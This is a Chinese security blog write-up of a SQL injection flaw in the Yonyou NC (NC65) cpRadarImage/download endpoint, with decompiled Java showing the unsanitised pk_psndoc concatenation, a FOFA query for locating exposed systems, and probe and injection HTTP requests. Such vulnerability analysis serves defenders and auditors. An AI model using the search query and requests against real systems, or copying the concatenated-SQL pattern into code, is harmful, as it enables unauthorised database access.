---
title: "用友NC cpRadarImage/download sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-cpRadarImage-download-pk_psndoc-sqli.html
asset_dir: assets/用友nc-cpradarimagedownload-sql注入漏洞
---

# 用友NC cpRadarImage/download sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/23 08:21
- 1087浏览
- [0评论](#comment)
- 1小时阅读

深入探索

SQL

软件

sql

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统/portal/pt/cpRadarImage/download接口中的pk\_psndoc参数实现[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 cpRadarImage 接口

[![用友NC cpRadarImage/download sql注入漏洞](images/img-001-2e06f0352513.webp)](https://image.mrxn.net/b167cbaa4b864789af5dc0ee8d14041e.webp)

因此搜索 cpRadarImage 方法的实现部分即可定位文件

代码安全审计

nc/bs/hrss/pub/action/CpRadarImageAction.class

```
package nc.bs.hrss.pub.action;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import nc.bs.framework.common.RuntimeEnv;
import nc.bs.hrss.cp.cpAnalysis.CPAnalysisMngCataPanel;
import nc.bs.hrss.cp.cpPortlet.ctrl.CPPortletViewMain;
import nc.bs.hrss.pub.exception.HrssException;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.vo.hr.tools.formconfig.CodeGenUtils;
import nc.vo.ml.NCLangRes4VoTransl;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.ArrayUtils;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(
    path = "/cpRadarImage"
)
public class CpRadarImageAction extends BaseAction {
    public CpRadarImageAction() {
    }

    @Action
    public void download() {
        OutputStream out = null;
        byte[] pngBytes = null;

        try {
            this.request.setCharacterEncoding("UTF-8");
            String pk_psndoc = this.request.getParameter("pk_psndoc");
            String object_id = this.request.getParameter("object_id");
            String object_type = this.request.getParameter("object_type");
            String size = this.request.getParameter("size");
            FileInputStream finput = null;

            try {
                if ("0".equals(size)) {
                    pngBytes = CPPortletViewMain.queryRadarChartByCond(CPAnalysisMngCataPanel.POST, pk_psndoc, object_id);
                } else if ("1".equals(size)) {
                    pngBytes = CPPortletViewMain.queryRadarChartByCond(Integer.parseInt(object_type), pk_psndoc, object_id);
                } else if ("2".equals(size)) {
                    pngBytes = CPPortletViewMain.queryBigRadarChartByCond(Integer.parseInt(object_type), pk_psndoc, object_id, 680, 400, 340, 50);
                }

                if (ArrayUtils.isEmpty(pngBytes)) {
                    String themeId = LfwRuntimeEnvironment.getThemeId();
                    String strSrcDir = CodeGenUtils.buildFileURL(RuntimeEnv.getInstance().getNCHome(), new String[]{"hotwebs", "lfw", "frame", "device_pc", "themes", themeId, "ext", "hrss", "cp", "evalueRadar_image.png", ""});
                    File file = new File(strSrcDir);
                    finput = new FileInputStream(file);
                    pngBytes = new byte[finput.available()];
                }

                if (ArrayUtils.isEmpty(pngBytes)) {
                    throw new HrssException(NCLangRes4VoTransl.getNCLangRes().getStrByID("c_cp-res", "0c_cp-res0041"));
                }

                out = this.response.getOutputStream();
                this.response.setContentType("image/png");
                out.write(pngBytes);
                out.flush();
            } catch (HrssException e) {
                e.deal();
            } catch (Exception e) {
                (new HrssException(e)).deal();
            } finally {
                if (finput != null) {
                    finput.close();
                }

            }
        } catch (Exception e) {
            throw new LfwRuntimeException(LfwResBundle.getInstance().getStrByID("c_pub-res", "0c_pub-res0051"), e);
        } finally {
            IOUtils.closeQuietly(out);
        }

    }
}
```

pk\_psndoc 参数直接代入 CPPortletViewMain.queryRadarChartByCond 函数，其实现逻辑如下

漏洞扫描服务

```
public byte[] queryRadarChartByCond(Integer object_type, String pk_psndoc, String object_id) throws BusinessException {
        GeneralVO[] indiResults = this.queryindiAnalysisResult(object_type, pk_psndoc, object_id);
        if (ArrayUtils.isEmpty(indiResults)) {
            return this.createSimpleChart(object_type, 400, 360, 200, 30);
        } else {
            AbilityMatchVO[] matchVOs = new AbilityMatchVO[indiResults.length];

            for(int i = 0; i < matchVOs.length; ++i) {
                matchVOs[i] = new AbilityMatchVO();
                matchVOs[i].setReqRank(new Double(indiResults[i].getAttributeValue("req_score").toString()));
                matchVOs[i].setActRank(new Double(indiResults[i].getAttributeValue("get_score").toString()));
                matchVOs[i].setIndiName((String)indiResults[i].getAttributeValue("indiname"));
            }

            return (new RadarChartViewer()).drawRadar(matchVOs, this.getRadarTitle(object_type), ResHelper.getString("6004matchay", "06004matchay0015"), 400, 360, 200, 30);
        }
    }
```

跟进 queryindiAnalysisResult 函数，其实现如下

计算机服务器

```
public GeneralVO[] queryindiAnalysisResult(Integer object_type, String pk_psndoc, String object_id) throws BusinessException {
        String psnjobsql = " hi_psnjob.ismainjob='Y' and hi_psnjob.endflag='N' and hi_psnjob.lastflag='Y' and hi_psnjob.pk_psndoc = '" + pk_psndoc + "'";
        PsnJobVO[] psnJobVOs = (PsnJobVO[])((IPersistenceRetrieve)NCLocator.getInstance().lookup(IPersistenceRetrieve.class)).retrieveByClause((String)null, PsnJobVO.class, psnjobsql);
        if (ArrayUtils.isEmpty(psnJobVOs)) {
            return null;
        } else {
            String pk_psnjob = psnJobVOs[0].getPk_psnjob();
            GeneralVO[] indiInfo = ((IMatchAnalyseQueryMaintain)NCLocator.getInstance().lookup(IMatchAnalyseQueryMaintain.class)).queryMatchObjPsnIndiResult((String)null, object_id, object_type, (String)null, pk_psnjob);
            return indiInfo;
        }
    }
```

直接将 pk\_psndoc 拼接进SQL语句中，然后将拼接后的SQL语句带入 retrieveByClause 函数后最终还是使用 executeQuery 来执行SQL语句，无任何过滤或校验，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

可先通过如下请求来确定目标是否存在此接口及其响应，如果存在此模块，则会响应一个图片内容

SQL注入检测工具

```
GET /portal/pt/cpRadarImage/download?object_id=1&object_type=1&pageId=login&pk_psndoc=1&size=0 HTTP/1.1
Host: nc65.mrxn.net
```

[![用友NC cpRadarImage/download sql注入漏洞](images/img-002-1cb18172ed95.webp)](https://image.mrxn.net/4c643607620741a793e0b7c310931abd.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

搜索引擎

```
GET /portal/pt/cpRadarImage/download?object_id=1&object_type=1&pageId=login&pk_psndoc=1'&size=0 HTTP/1.1
Host: nc65.mrxn.net
```

[![用友NC cpRadarImage/download sql注入漏洞](images/img-003-bc3ef645ff36.webp)](https://image.mrxn.net/1074b14a0e834701bcf2f872ab2ef880.webp)

成功延时 5 秒

编程

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=568`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
